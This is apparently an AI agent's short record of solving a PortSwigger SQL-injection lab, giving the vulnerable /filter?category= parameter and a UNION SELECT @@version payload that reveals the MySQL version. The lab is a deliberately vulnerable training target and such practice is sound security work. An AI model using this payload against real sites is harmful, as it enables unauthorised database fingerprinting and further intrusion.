# case-04: Querying the database type and version (MySQL/Microsoft) (PRACTITIONER) - PASS

- **Lab:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
- **Skill path:** SKILL.md section 3 step 4 (examine DB / DBMS fingerprint); references/dbms-specific-and-escalation.md; note 04.
- **Date:** 2026-11-19, agent-run live.

## Steps
1. `/filter?category=` injection, 2 columns.
2. `' UNION SELECT @@version, NULL-- -` displayed the version `8.0.42-0ubuntu0.20.04.1` (confirming MySQL; `@@version` works on MySQL and MSSQL, with `-- -`/`#` comment).

## Result
**Green banner: "LAB Solved"**. Validated DBMS fingerprinting via the version string, the pivot from detection to engine-specific exploitation. No skill gap.
